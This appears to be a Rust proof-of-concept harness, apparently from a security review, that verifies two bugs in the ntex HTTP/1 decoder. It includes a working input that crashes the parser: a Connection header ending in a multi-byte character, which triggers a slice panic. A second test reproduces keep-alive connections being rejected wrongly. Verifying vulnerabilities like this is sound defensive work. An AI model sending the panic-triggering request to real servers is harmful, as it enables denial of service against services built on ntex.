// PoC/verification harness for two ntex findings (3-pass blind+TM campaign, 2026-07-23):
//   #1 panic via non-char-boundary str slice in connection_type() (decoder.rs:526, HIGH)
//   #2 Inner::consumed never resets -> spurious TooLarge on long-lived keep-alive (decoder.rs:180/185, MEDIUM)
// Drives the REAL public ntex::http::h1::Codec (ntex-httparse included) end-to-end — no fuzzing
// needed, the mechanism is precise; this is a targeted deterministic construction.
use ntex::codec::Decoder;
use ntex::http::h1::Codec;
use ntex::http::HttpServiceConfig;
use ntex::util::BytesMut;
use ntex::SharedCfg;

fn new_codec() -> Codec {
    let cfg: SharedCfg = SharedCfg::new("DBG").add(HttpServiceConfig::new()).into();
    Codec::new(0, cfg.get())
}

fn poc1_panic() {
    println!("==== PoC#1: non-char-boundary slice panic in connection_type()");
    // Header value bytes: 'c','X','X', then EURO SIGN (U+20AC = 0xE2 0x82 0xAC).
    // connection_type(): byte0='c' -> pos = 0 + "close".len() = 5. l=6 >= 5 passes the bounds
    // check, but byte index 5 sits INSIDE the 3-byte euro-sign char (which spans indices 3..6),
    // so val[0..5] is not a char-boundary slice -> Rust panics.
    let mut val = Vec::new();
    val.push(b'c');
    val.push(b'X');
    val.push(b'X');
    val.extend_from_slice("€".as_bytes()); // 0xE2 0x82 0xAC
    assert_eq!(val.len(), 6, "sanity: euro sign must be 3 bytes");
    assert!(
        std::str::from_utf8(&val).is_ok(),
        "sanity: the byte sequence itself must be valid UTF-8 (so HeaderValue::to_str() succeeds)"
    );

    let mut req = Vec::new();
    req.extend_from_slice(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: ");
    req.extend_from_slice(&val);
    req.extend_from_slice(b"\r\n\r\n");

    let codec = new_codec();
    let mut buf = BytesMut::new();
    buf.extend_from_slice(&req);

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| codec.decode(&mut buf)));
    match result {
        Ok(Ok(Some((r, _)))) => println!(
            "  NO PANIC: request decoded normally: {} {} (finding REFUTED as stated, or byte layout wrong)",
            r.method(),
            r.path()
        ),
        Ok(Ok(None)) => println!("  NO PANIC: incomplete (need more data) — unexpected"),
        Ok(Err(e)) => println!("  NO PANIC: request REJECTED: {e:?} (byte sequence filtered before reaching connection_type — finding REFUTED for this construction)"),
        Err(payload) => {
            let msg = payload
                .downcast_ref::<String>()
                .cloned()
                .or_else(|| payload.downcast_ref::<&str>().map(|s| s.to_string()))
                .unwrap_or_else(|| "<non-string panic payload>".to_string());
            println!("  >>> PANIC CONFIRMED: {msg}");
        }
    }
    println!();
}

fn poc2_consumed_never_resets() {
    println!("==== PoC#2: Inner::consumed never resets -> spurious TooLarge on valid keep-alive traffic");
    let codec = new_codec();
    const MAX_BUF: usize = 64 * 1024; // HttpServiceConfig default max_buf_size

    // Phase A: feed many small, FULLY-BUFFERED, valid requests (one decode() call each, whole
    // request present in the buffer so pending=false and the TooLarge check never fires for
    // these calls) until Inner::consumed alone exceeds MAX_BUF.
    let one = b"GET /a HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n".to_vec(); // 51 bytes
    let mut total_consumed_estimate = 0usize;
    let mut n = 0usize;
    loop {
        let mut buf = BytesMut::new();
        buf.extend_from_slice(&one);
        match codec.decode(&mut buf) {
            Ok(Some(_)) => {
                total_consumed_estimate += one.len();
                n += 1;
            }
            other => {
                println!("  unexpected during warm-up at n={n}: {other:?}");
                return;
            }
        }
        if total_consumed_estimate > MAX_BUF {
            break;
        }
        if n > 5000 {
            println!("  warm-up did not exceed MAX_BUF after {n} requests — aborting");
            return;
        }
    }
    println!(
        "  Phase A: {n} complete valid requests processed, ~{total_consumed_estimate}B of header bytes consumed (> {MAX_BUF}B MAX_BUF), each individually accepted with no error."
    );

    // Phase B: now send a PARTIAL request (headers not yet terminated) — a small, ordinary
    // in-progress read, the kind that happens on every real connection whenever a request
    // arrives split across TCP segments. This alone is far under MAX_BUF.
    let partial = b"GET /legit HTTP/1.1\r\nHost: x\r\n"; // 31 bytes, no terminating blank line
    let mut buf2 = BytesMut::new();
    buf2.extend_from_slice(partial);
    let result = codec.decode(&mut buf2);
    match result {
        Ok(None) => println!(
            "  Phase B: partial request ({}B) correctly treated as 'need more data' — bug NOT reproduced this run.",
            partial.len()
        ),
        Err(e) => println!(
            "  >>> Phase B: partial, perfectly ordinary {}B request REJECTED: {e:?}\n      (Inner::consumed carried {}B+ from Phase A's ALREADY-COMPLETED requests into this unrelated in-progress read — spurious TooLarge / forced disconnect on legitimate traffic)",
            partial.len(),
            total_consumed_estimate
        ),
        Ok(Some(_)) => println!("  Phase B: unexpectedly decoded as complete — construction error"),
    }
    println!();
}

fn main() {
    poc1_panic();
    poc2_consumed_never_resets();
    println!("TEST-EXIT=0");
}
